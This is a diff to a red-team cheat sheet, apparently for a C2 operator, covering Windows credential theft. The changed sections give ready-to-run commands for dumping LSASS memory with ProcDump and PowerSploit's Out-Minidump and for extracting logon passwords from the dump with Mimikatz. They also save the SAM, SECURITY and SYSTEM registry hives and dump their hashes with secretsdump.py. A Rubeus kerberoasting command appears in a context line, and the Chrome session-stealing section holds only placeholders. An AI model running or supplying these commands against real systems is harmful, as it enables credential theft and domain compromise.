@@ -109,8 +109,8 @@ execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccoun
 
 ### Chrome Session Stealing
 SharpDPAPI to dump domain master key (requires DA privileges)
-````
-test
+```
+fill in
 ```
 
 SharpChrome - test
@@ -122,32 +122,33 @@ SharpChrome - test
 
 ```
 
-
 ------------------------------------------------------------------------------------------
 ## Exfiltration - Password Attacks
 ### Dumping LSASS locally
 Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagged by AV and raise alerts but will often still output dump file)
 ```
-# upload --> ProcDump.exe
-# shell ProcDump.exe -accepteula -ma lsass.exe lsass.dmp
+upload --> ProcDump.exe
+shell ProcDump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
-Dumping LSASS with [Out-Minidump.ps from PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)
+Dumping LSASS with [Out-Minidump.ps from PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1) without touching disk
 ```
-# powershell Get-Process | Out-Minidump -DumpFilePath C:\temp
+powershell Get-Process | Out-Minidump -DumpFilePath C:\temp
 ```
 Extracting hashes offline from LSASS using Mimikatz
 ```
-# mimikatz.exe log "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "sekurlsa::wdigest" exit
+mimikatz.exe log "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "sekurlsa::wdigest" exit
 ```
-### SAM dump
-```
-# shell reg.exe save HKLM\sam sam.save
-# shell reg.exe save HKLM\security security.save
-# shell reg.exe save HKLM\system system.save
 
-Download files to dump SAM hahses offline using Secretsdump.py
-# python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+### SAM database dump using reg.exe (requries local Admin)
 ```
+shell reg.exe save HKLM\sam sam.save
+shell reg.exe save HKLM\security security.save
+shell reg.exe save HKLM\system system.save
+
+# Download SAM files then dump hahses offline using Secretsdump.py
+python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+
 ### NTDS.dit dump
 [Secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to dump NTDS.dit remotely
 ```
